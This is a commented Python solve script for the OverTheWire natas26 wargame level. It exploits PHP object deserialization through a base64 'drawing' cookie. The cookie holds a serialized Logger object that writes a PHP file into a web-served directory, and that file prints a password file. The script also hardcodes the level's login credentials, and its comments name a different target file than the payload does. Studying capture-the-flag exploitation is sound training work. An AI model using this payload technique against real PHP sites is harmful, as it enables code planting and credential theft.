import requests
import bs4
import re


# configuration for natas26
USERNAME = 'natas26'
PASSWORD = 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'
AUTH = requests.auth.HTTPBasicAuth(USERNAME, PASSWORD)
URL = 'http://natas26.natas.labs.overthewire.org/'


session = requests.Session()
session.auth = AUTH
# get the challenge content
response = session.get(URL)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')


# get the source code
response = session.get(URL + 'index-source.html')
# print(response.text)


# firstly, let's try to use the feature provided by the web server, 
# which is drawing a straight line
params = {
    'x1' : 50,
    'y1' : 50,
    'x2' : 100,
    'y2' : 100
}
response = session.get(URL, params=params)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')


# next, we can find the image we requested in the following link
# img/natas26_<PHPSESSID>.png, which we can try and access
img_link = re.search(r'img src="(img/natas26_\w+\.png)"', str(div_content))[1]
response = session.get(URL + '/' + img_link)
print(response)
# therefore, we can assume that we have the permission to access the content of the img directory


# in the source code, we have the following Logger class
# which contains one of the PHP magic methods, __destruct()
# reference: https://www.php.net/manual/en/language.oop5.magic.php
"""
class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;    

    <!-- code here -->        
    
    function __destruct(){
        // write exit message
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$this->exitMsg);
        fclose($fd);
    }                       
}
"""
# and there is also a function that unserialize the "drawing" cookie
"""
$drawing=unserialize(base64_decode($_COOKIE["drawing"]));
"""
# which is user controlable
# therefore, we can conclude that the vulnerability involves PHP deserialization
# reference: https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a
# essentially, we can try to create a new Logger object and control its private properties
# then, we serialise the newly created object and send it to the web server
# finally, when 
"""
$drawing=unserialize(base64_decode($_COOKIE["drawing"]));
"""
# is executed, the object will be created
# then, the __destruct() function will be called when it's done with the object
# usually, __destruct() is used for garbage collection, in this case,
# however, it is used to write an exit message
# therefore, we can use __destruct to write the password of natas27 to a file in the img directory


# we can serialize the Logger object by running serialize.php
# set the cookies
cookies_dict = session.cookies.get_dict()
cookies_dict["drawing"] = "Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoyNToiaW1nL3Bhc3N3b3Jkb2ZuYXRhczI3LnBocCI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjU4OiI8PyBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCcvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNicpID8%2BIjt9"
# create a new cookiejar for the session
session.cookies.clear()
requests.utils.cookiejar_from_dict(cookies_dict, session.cookies)